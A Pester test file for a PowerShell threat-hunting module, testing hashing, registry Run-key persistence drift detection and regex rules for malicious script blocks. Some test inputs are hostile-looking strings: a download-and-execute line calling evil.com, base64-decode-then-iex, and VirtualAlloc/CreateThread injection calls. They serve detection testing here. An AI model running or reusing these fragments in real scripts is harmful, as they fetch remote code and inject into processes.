#Requires -Modules @{ ModuleName = 'Pester'; ModuleVersion = '5.5.0' }
<#
.SYNOPSIS
    Tests Pester v5 para HuntKit.
.DESCRIPTION
    Cubre: hash helper, deteccion de drift, reglas de script blocks,
    y procesamiento de evtx sintetico via parametro -EvtxPath.
#>

BeforeAll {
    # Importar modulo fresco antes de todos los tests
    $modulePath = Join-Path $PSScriptRoot '..\HuntKit\HuntKit.psd1'
    Import-Module $modulePath -Force
}

AfterAll {
    Remove-Module HuntKit -ErrorAction SilentlyContinue
}

# ── Helper SHA-256 ─────────────────────────────────────────────────────────────

Describe 'Get-StringHash (helper interno)' {
    It 'Genera un hash SHA-256 de 64 caracteres hexadecimales' {
        $hash = InModuleScope HuntKit { Get-StringHash 'notepad.exe' }
        $hash | Should -Match '^[a-f0-9]{64}$'
    }

    It 'Es determinista para la misma entrada' {
        $h1 = InModuleScope HuntKit { Get-StringHash 'test-input' }
        $h2 = InModuleScope HuntKit { Get-StringHash 'test-input' }
        $h1 | Should -BeExactly $h2
    }

    It 'Produce hashes distintos para entradas distintas' {
        $h1 = InModuleScope HuntKit { Get-StringHash 'notepad.exe' }
        $h2 = InModuleScope HuntKit { Get-StringHash 'calc.exe' }
        $h1 | Should -Not -Be $h2
    }
}

# ── Baseline & Drift ───────────────────────────────────────────────────────────

Describe 'Save-PersistenceBaseline / Get-PersistenceDrift' {

    BeforeAll {
        $script:BaselinePath = Join-Path $TestDrive 'test_baseline.json'
    }

    It 'Guarda un archivo JSON valido' {
        Save-PersistenceBaseline -Path $script:BaselinePath
        $script:BaselinePath | Should -Exist
        $content = Get-Content $script:BaselinePath -Raw | ConvertFrom-Json
        $content.Version | Should -Be '1.0'
        $content.Items   | Should -Not -BeNullOrEmpty
    }

    It 'Drift sin cambios devuelve lista vacia' {
        $drift = Get-PersistenceDrift -BaselinePath $script:BaselinePath
        $drift | Should -HaveCount 0
    }

    It 'Detecta una Run Key anadida (T1547.001) y la elimina' {
        # Simular persistencia benigna
        $regPath = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        Set-ItemProperty -Path $regPath -Name 'HuntKitPesterTest' -Value 'notepad.exe'

        try {
            $drift = Get-PersistenceDrift -BaselinePath $script:BaselinePath
            $added = $drift | Where-Object { $_.ChangeType -eq 'Added' -and $_.Name -eq 'HuntKitPesterTest' }
            $added            | Should -Not -BeNullOrEmpty
            $added.Technique  | Should -Be 'T1547.001'
            $added.ChangeType | Should -Be 'Added'
        }
        finally {
            Remove-ItemProperty -Path $regPath -Name 'HuntKitPesterTest' -ErrorAction SilentlyContinue
        }
    }

    It 'El reporte HTML se genera cuando se pasa -OutputPath' {
        $htmlPath = Join-Path $TestDrive 'drift_report.html'
        Get-PersistenceDrift -BaselinePath $script:BaselinePath -OutputPath $htmlPath
        $htmlPath | Should -Exist
        $html     = Get-Content $htmlPath -Raw
        $html     | Should -Match 'HuntKit'
    }
}

# ── Reglas Script-Block (logica pura, sin necesidad de WinEvent) ───────────────

Describe 'Script-Block Rules (validacion de reglas regex)' {

    # Funcion helper: construye un objeto de evento sintetico y
    # llama a la logica de reglas directamente via InModuleScope
    function Invoke-RuleMatch {
        param([string]$ScriptText, [string]$MinSeverity = 'Low')
        InModuleScope HuntKit {
            param($text, $minSev)
            $severityOrder = @{ Low = 0; Medium = 1; High = 2; Critical = 3 }
            $minLevel      = $severityOrder[$minSev]
            $results       = @()
            foreach ($rule in $script:ScriptBlockRules) {
                if ($severityOrder[$rule.Severity] -lt $minLevel) { continue }
                if ($rule.Pattern.IsMatch($text)) {
                    $results += [PSCustomObject]@{
                        RuleId    = $rule.Id
                        Severity  = $rule.Severity
                        Technique = $rule.Technique
                    }
                }
            }
            return $results
        } -Parameters $ScriptText, $MinSeverity
    }

    Context 'SB001 - IEX / Invoke-Expression (T1059.001)' {
        It 'Detecta IEX con parentesis' {
            $r = Invoke-RuleMatch 'iex(New-Object Net.WebClient)'
            $r | Where-Object RuleId -eq 'SB001' | Should -Not -BeNullOrEmpty
        }
        It 'Detecta Invoke-Expression con variable' {
            $r = Invoke-RuleMatch 'Invoke-Expression $payload'
            $r | Where-Object RuleId -eq 'SB001' | Should -Not -BeNullOrEmpty
        }
        It 'No genera falso positivo en Get-Date' {
            $r = Invoke-RuleMatch 'Get-Date | Out-File log.txt'
            $r | Where-Object RuleId -eq 'SB001' | Should -BeNullOrEmpty
        }
    }

    Context 'SB002 - Base64 + ejecucion (T1140)' {
        It 'Detecta FromBase64String seguido de invoke' {
            $r = Invoke-RuleMatch '[Convert]::FromBase64String("dGVzdA==") | invoke'
            $r | Where-Object RuleId -eq 'SB002' | Should -Not -BeNullOrEmpty
        }
        It 'Detecta FromBase64String seguido de iex' {
            $r = Invoke-RuleMatch '$d=[Convert]::FromBase64String("abc"); iex $d'
            $r | Where-Object RuleId -eq 'SB002' | Should -Not -BeNullOrEmpty
        }
    }

    Context 'SB003 - Descarga remota (T1059.001)' {
        It 'Detecta Net.WebClient.DownloadString' {
            $r = Invoke-RuleMatch '(New-Object Net.WebClient).DownloadString("http://evil.com")'
            $r | Where-Object RuleId -eq 'SB003' | Should -Not -BeNullOrEmpty
        }
        It 'Detecta Invoke-WebRequest DownloadFile' {
            $r = Invoke-RuleMatch 'Invoke-WebRequest -Uri http://x.com -OutFile DownloadFile.exe'
            $r | Where-Object RuleId -eq 'SB003' | Should -Not -BeNullOrEmpty
        }
    }

    Context 'SB005 - Inyeccion de proceso (T1055)' {
        It 'Detecta VirtualAlloc' {
            $r = Invoke-RuleMatch '$addr = [Kernel32]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)'
            $r | Where-Object RuleId -eq 'SB005' | Should -Not -BeNullOrEmpty
        }
        It 'Detecta CreateThread' {
            $r = Invoke-RuleMatch '[Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)'
            $r | Where-Object RuleId -eq 'SB005' | Should -Not -BeNullOrEmpty
        }
        It 'Severidad es Critical' {
            $r = Invoke-RuleMatch 'VirtualAlloc'
            ($r | Where-Object RuleId -eq 'SB005').Severity | Should -Be 'Critical'
        }
    }

    Context 'Filtraje por MinSeverity' {
        It 'MinSeverity=High oculta reglas Medium' {
            $r = Invoke-RuleMatch '(New-Object Net.WebClient).DownloadString("http://x.com")' -MinSeverity 'High'
            # SB003 es Medium, no debe aparecer
            $r | Where-Object RuleId -eq 'SB003' | Should -BeNullOrEmpty
        }
        It 'MinSeverity=Medium muestra reglas High' {
            $r = Invoke-RuleMatch 'iex($payload)' -MinSeverity 'Medium'
            $r | Where-Object RuleId -eq 'SB001' | Should -Not -BeNullOrEmpty
        }
    }
}

# ── Get-PersistenceSummary ─────────────────────────────────────────────────────

Describe 'Get-PersistenceSummary' {
    It 'Devuelve objetos con las propiedades esperadas' {
        $summary = Get-PersistenceSummary
        $summary | Should -Not -BeNullOrEmpty
        $first   = $summary | Select-Object -First 1
        $first | Select-Object -ExpandProperty Type      | Should -Not -BeNullOrEmpty
        $first | Select-Object -ExpandProperty Technique | Should -Not -BeNullOrEmpty
        $first | Select-Object -ExpandProperty Hash      | Should -Match '^[a-f0-9]{64}$'
    }
}
